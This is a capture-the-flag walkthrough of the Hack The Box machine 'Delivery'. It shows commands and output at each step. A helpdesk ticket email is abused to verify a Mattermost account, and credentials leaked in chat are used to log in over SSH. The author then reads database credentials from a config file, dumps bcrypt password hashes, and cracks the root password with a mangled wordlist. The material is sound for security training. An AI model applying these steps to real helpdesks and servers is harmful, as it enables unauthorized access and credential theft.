---
permalink: /misc/htb/delivery
title: Delivery
---

<br>

# nmap


```
[connor@fedora delivery]$ nmap 10.10.10.222  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-30 07:56 AEST  
Nmap scan report for 10.10.10.222  
Host is up (0.79s latency).  
Not shown: 998 closed tcp ports (conn-refused)  
PORT   STATE SERVICE  
22/tcp open  ssh  
80/tcp open  http  
  
Nmap done: 1 IP address (1 host up) scanned in 70.49 seconds
```


Add the hostname to /etc/hosts:

```
10.10.10.222 delivery.htb helpdesk.delivery.htb
```

Then we can go to http://helpdesk.delivery.htb/, click 'open a new ticket', and fill in details.

I used email: user@delivery.htb

Then I got 'You may check the status of your ticket, by navigating to the Check Status page using ticket id: 4774706.

If you want to add more information to your ticket, just email 4774706@delivery.htb.'

Then use the email 4774706@delivery.htb to sign up here http://delivery.htb:8065/signup_email

Then go back and click 'check ticket status' with  user@delivery.htb and ticket id: 4774706.

We see a confirmation URL <http://delivery.htb/:8065/do_verify_email?token=yfb6qoounnptzz6biskzss9mq79hhp1h7nkkij4sgtpa41rid9p8d1zb8km36ph6&email=4774706%40delivery.htb>

Now we have access to the Internal team!

There's credentials in the chat:

@developers Please update theme to the OSTicket before we go live. Credentials to the server are maildeliverer:Youve_G0t_Mail!

```
[connor@fedora delivery]$ ssh maildeliverer@10.10.10.222  
maildeliverer@10.10.10.222's password:    
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64  
  
Last login: Mon Aug 29 18:16:43 2022 from 10.10.16.5   
maildeliverer@Delivery:~$ ls  
user.txt  
maildeliverer@Delivery:~$
```


Privesc

We can find the mattermost config and look through it:

```
maildeliverer@Delivery:~$ less /opt/mattermost/config/config.json
```


There are more creds: `mmuser:Crack_The_MM_Admin_PW`

```
maildeliverer@Delivery:~$ mysql -u mmuser -p  
Enter password:    
Welcome to the MariaDB monitor.  Commands end with ; or \g.  
Your MariaDB connection id is 69  
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10  
  
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.  
  
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement  
.  
  
MariaDB [(none)]> use mattermost;  
Reading table information for completion of table and column names  
You can turn off this feature to get a quicker startup with -A  
  
Database changed  
MariaDB [mattermost]> describe Users;  
+--------------------+--------------+------+-----+---------+-------+  
| Field              | Type         | Null | Key | Default | Extra |  
+--------------------+--------------+------+-----+---------+-------+  
| Id                 | varchar(26)  | NO   | PRI | NULL    |       |  
| CreateAt           | bigint(20)   | YES  | MUL | NULL    |       |  
| UpdateAt           | bigint(20)   | YES  | MUL | NULL    |       |  
| DeleteAt           | bigint(20)   | YES  | MUL | NULL    |       |  
| Username           | varchar(64)  | YES  | UNI | NULL    |       |  
| Password           | varchar(128) | YES  |     | NULL    |       |  
| AuthData           | varchar(128) | YES  | UNI | NULL    |       |  
| AuthService        | varchar(32)  | YES  |     | NULL    |       |  
| Email              | varchar(128) | YES  | UNI | NULL    |       |  
| EmailVerified      | tinyint(1)   | YES  |     | NULL    |       |  
| Nickname           | varchar(64)  | YES  |     | NULL    |       |  
| FirstName          | varchar(64)  | YES  |     | NULL    |       |  
| LastName           | varchar(64)  | YES  |     | NULL    |       |  
| Position           | varchar(128) | YES  |     | NULL    |       |  
| Roles              | text         | YES  |     | NULL    |       |  
| AllowMarketing     | tinyint(1)   | YES  |     | NULL    |       |  
| Props              | text         | YES  |     | NULL    |       |  
| NotifyProps        | text         | YES  |     | NULL    |       |  
| LastPasswordUpdate | bigint(20)   | YES  |     | NULL    |       |  
| LastPictureUpdate  | bigint(20)   | YES  |     | NULL    |       |  
| FailedAttempts     | int(11)      | YES  |     | NULL    |       |  
| Locale             | varchar(5)   | YES  |     | NULL    |       |  
| Timezone           | text         | YES  |     | NULL    |       |  
| MfaActive          | tinyint(1)   | YES  |     | NULL    |       |  
| MfaSecret          | varchar(128) | YES  |     | NULL    |       |  
+--------------------+--------------+------+-----+---------+-------+  
25 rows in set (0.001 sec)  
  
MariaDB [mattermost]> select Username, Password from Users;  
+----------------------------------+--------------------------------------------------------------+  
| Username                         | Password                                                     |  
+----------------------------------+--------------------------------------------------------------+  
| user                             | $2a$10$XF6KLh8itiBsLQV9ooQmpu6G62fWtDz2OxItmDYJNbxS01cS75mg. |  
| surveybot                        |                                                              |  
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |  
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |  
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |  
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |  
| channelexport                    |                                                              |  
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |  
+----------------------------------+--------------------------------------------------------------+  
8 rows in set (0.001 sec)
```

From the chat we know the password is some variation of PleaseSubscribe!

```
[connor@fedora delivery]$ wget https://raw.githubusercontent.com/hashcat/hashcat/master/rules/best64.rule
[connor@fedora delivery]$ echo PleaseSubscribe! | hashcat -r best64.rule --stdout > wordlist  
[connor@fedora delivery]$ vim hash  
[connor@fedora delivery]$ cat hash  
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO  
[connor@fedora delivery]$ john hash --wordlist=wordlist  
Using default input encoding: UTF-8  
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])  
Cost 1 (iteration count) is 1024 for all loaded hashes  
Will run 4 OpenMP threads  
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status  
PleaseSubscribe!21 (?)
```

We've cracked the root password!

```
maildeliverer@Delivery:~$ su  
Password:    
root@Delivery:/home/maildeliverer# cd /root  
root@Delivery:~# ls  
mail.sh  note.txt  py-smtp.py  root.txt  
root@Delivery:~# cat note.txt    
I hope you enjoyed this box, the attack may seem silly but it demonstrates a pretty high risk vulnerability I've seen several times.  The inspiration for the  
box is here:    
  
- https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c    
  
Keep on hacking! And please don't forget to subscribe to all the security streamers out there.  
  
- ippsec
```
